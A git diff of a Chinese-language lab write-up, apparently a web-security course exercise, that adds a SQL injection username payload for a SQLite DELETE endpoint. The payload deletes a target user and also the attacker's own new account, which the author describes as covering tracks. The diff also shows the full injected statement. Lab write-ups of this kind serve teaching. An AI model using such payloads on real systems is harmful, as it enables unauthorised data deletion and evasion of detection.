@@ -1256,7 +1256,18 @@ document.cookie = "session=".concat(btoa(attackerCookie));
 ```
 
 ## Exploit Echo SQL Injection
-题目要求，创建一个新的用户，点击`close`时候删除`user3`，`close`的API接口如下，可以看到SQL命令把整个`username`都放进去了，所以可以注入SQL，只要使得`username=user3";`即可
+题目要求，创建一个新的用户，点击`close`时候删除`user3`，然后也要删除刚刚新建的账号，掩人耳目2333333
+
+`close`的API接口如下，可以看到SQL命令把整个`username`都放进去了，所以可以注入SQL，注意题目要求不仅仅删除`user3`还要删除刚刚新建的，docker里面用的是SQLite，查doc发现只有LIKE操作，所以可以添加以下用户
+
+```SQL
+user3" OR username LIKE 'user3" OR username LIKE %';
+```
+
+完整的SQL命令如下
+```SQL
+DELETE FROM Users WHERE username == "  user3" OR username LIKE 'user3" OR username LIKE %';  ";
+```
 
 `close` API最后log一下db，发现`user3`已经消失了
 ```javascript
